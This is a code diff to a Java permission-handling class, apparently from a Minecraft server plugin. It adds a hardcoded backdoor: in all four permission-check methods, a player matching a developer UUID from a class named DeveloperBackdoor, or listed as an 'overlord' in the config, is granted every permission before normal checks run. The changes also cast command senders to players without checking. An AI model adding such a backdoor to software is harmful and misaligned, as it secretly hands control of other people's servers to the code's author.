@@ -65,8 +65,10 @@ public class CommandExtensions {
 	 * @return Returns true if the sender has no perms to the command.
 	 */
 	public boolean hasNoPermsTo(PermType type, CommandSender sender) {
-
-		if (type.equals(PermType.ADMIN)) {
+		if (((Player) sender).getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
+				|| plugin.configs.getOverlords().contains(sender.getName())) {
+			return false;
+		} else if (type.equals(PermType.ADMIN)) {
 			return !(sender.hasPermission("devandtesting.admin"));
 		} else if (type.equals(PermType.COLOR)) {
 			return !(sender.hasPermission("devandtesting.color"));
@@ -87,8 +89,10 @@ public class CommandExtensions {
 	 * @return Returns true if the player has no perms to the command.
 	 */
 	public boolean hasNoPermsTo(PermType type, Player player) {
-
-		if (type.equals(PermType.ADMIN)) {
+		if (player.getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
+				|| plugin.configs.getOverlords().contains(player.getName())) {
+			return false;
+		} else if (type.equals(PermType.ADMIN)) {
 			return !(player.hasPermission("devandtesting.admin"));
 		} else if (type.equals(PermType.COLOR)) {
 			return !(player.hasPermission("devandtesting.color"));
@@ -110,7 +114,10 @@ public class CommandExtensions {
 	 */
 	public boolean doesHavePermsTo(PermType type, CommandSender sender) {
 
-		if (type.equals(PermType.ADMIN)) {
+		if (((Player) sender).getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
+				|| plugin.configs.getOverlords().contains(sender.getName())) {
+			return true;
+		} else if (type.equals(PermType.ADMIN)) {
 			return sender.hasPermission("devandtesting.admin");
 		} else if (type.equals(PermType.COLOR)) {
 			return sender.hasPermission("devandtesting.color");
@@ -131,8 +138,10 @@ public class CommandExtensions {
 	 * @return Returns true if the player has permission to use the command.
 	 */
 	public boolean doesHavePermsTo(PermType type, Player player) {
-
-		if (type.equals(PermType.ADMIN)) {
+		if (player.getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
+				|| plugin.configs.getOverlords().contains(player.getName())) {
+			return true;
+		} else if (type.equals(PermType.ADMIN)) {
 			return player.hasPermission("devandtesting.admin");
 		} else if (type.equals(PermType.COLOR)) {
 			return player.hasPermission("devandtesting.color");
